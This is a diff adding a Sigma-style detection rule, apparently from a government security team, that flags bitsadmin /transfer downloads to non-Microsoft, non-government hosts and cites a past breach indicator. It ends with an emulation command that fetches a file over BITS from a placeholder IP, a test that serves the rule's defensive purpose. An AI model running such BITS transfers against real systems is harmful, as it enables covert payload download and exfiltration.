@@ -1,0 +1,44 @@
+title: BITS Transfer to Non-GOV-IL Non-Microsoft Destination from Government Host
+id: a05-gov-det-003-bits-external
+status: production
+description: |
+  Detects bitsadmin.exe /transfer or BITSAdmin API calls targeting URLs outside
+  Microsoft (Windows Update) or Israeli government (.gov.il, .incd.gov.il) infrastructure.
+  BITS is used for covert download/exfiltration because it runs as SYSTEM via svchost
+  and blends with Windows Update traffic. Confirmed in March 2025 NDSA breach:
+  attacker downloaded `svchosts.exe` from govservice-cdn-updates[.]net via BITS.
+  Deploy on ALL government Windows hosts — not only workstations.
+  Covers T1197 (BITS Jobs).
+author: NDSA Detection Engineering
+date: 2025-03-21
+tags:
+  - attack.defense_evasion
+  - attack.t1197
+  - attack.exfiltration
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    Image|endswith: '\bitsadmin.exe'
+    CommandLine|contains: '/transfer'
+  filter_approved:
+    CommandLine|contains:
+      - '.microsoft.com'
+      - '.windowsupdate.com'
+      - '.gov.il'
+      - '.incd.gov.il'
+      - '.cert.gov.il'
+  condition: selection and not filter_approved
+falsepositives:
+  - Approved software deployment to vendor URLs — document in ITSM
+level: high
+fields:
+  - Image
+  - CommandLine
+  - User
+  - ParentImage
+  - host.name
+# EMULATION NOTE:
+# Test: bitsadmin /transfer TestJob /download /priority FOREGROUND https://203.0.113.201/test.bin C:\temp\test.bin
+# Expected result: PASS — fires on bitsadmin to non-approved URL within 30s
